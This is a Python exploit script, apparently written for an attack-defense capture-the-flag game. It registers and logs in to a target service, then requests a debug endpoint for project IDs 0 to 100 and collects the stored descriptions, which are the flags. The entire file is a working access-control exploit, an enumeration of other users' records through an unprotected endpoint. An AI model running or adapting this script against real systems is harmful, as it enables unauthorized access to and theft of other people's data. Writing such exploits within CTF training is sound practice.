import requests
import json
import sys

INFO = 'pentester123'
LOGIN = 'hacker12345'
PASSWORD = 'hahacker'
NUMBER_OF_PROJ = 100
PORT = 8000


def register(url):
    creds = {"username": LOGIN, "password": PASSWORD, "info": INFO}
    r = requests.post(f'{url}/register', json=creds)
    print(r.text)


def login(url):
    creds = {"username": LOGIN, "password": PASSWORD}
    r = requests.post(f'{url}/login', json=creds)
    token = json.loads(r.text)["token"]
    print(token)
    print(r.text)
    return token


def main():
    """
    Надо токен авторизации и project_id для запроса
    """
    args = sys.argv[1:]
    print(args[0])
    url = f'http://{args[0]}:{PORT}/api'
    register(url)
    auth_header = {'Authorization': f'Bearer {login(url)}'}
    flags = []
    for i in range(NUMBER_OF_PROJ+1):
        r = requests.get(f'{url}/debug?project_id={i}',
                         headers=auth_header)
        if r.status_code == 200:
            flags.append(r.text)
    for i in range(len(flags)):
        flags[i] = json.loads(flags[i])[0]["description"]
    return list(filter(None, flags))


if __name__ == "__main__":
    print(main())
